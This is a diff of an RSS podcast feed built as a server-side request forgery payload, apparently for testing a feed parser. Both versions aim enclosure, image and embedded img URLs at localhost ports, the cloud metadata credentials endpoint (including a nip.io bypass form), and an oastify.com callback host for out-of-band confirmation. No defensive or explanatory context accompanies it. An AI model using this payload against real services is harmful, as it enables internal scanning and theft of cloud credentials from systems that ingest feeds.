@@ -1,25 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" 
-     xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" 
-     xmlns:content="http://purl.org/rss/1.0/modules/content/">
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Advanced SSRF Analysis</title>
+    <title>SSRF Time Analysis</title>
     <link>http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/web</link>
-    <language>en-us</language>
-    
     <item>
-      <title>Internal Scan Episode</title>
-      
-      <enclosure url="http://127.0.0.1:22/" length="1024" type="audio/mpeg"/>
-      
-      <itunes:image href="http://127.0.0.1:80/favicon.ico"/>
-      
-      <description>Testing internal metadata access</description>
-      <content:encoded>
-        <![CDATA[ <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]]>
-      </content:encoded>
-      
-      <link>http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/track</link>
+      <title>Probe 1</title>
+      <enclosure url="http://169.254.169.254.nip.io/latest/meta-data/" length="1024" type="audio/mpeg"/>
+      <itunes:image href="http://qpjv11u6uav34n4vaidajwbl8ce32zqo.oastify.com/port_scan_active"/>
     </item>
   </channel>
 </rss>
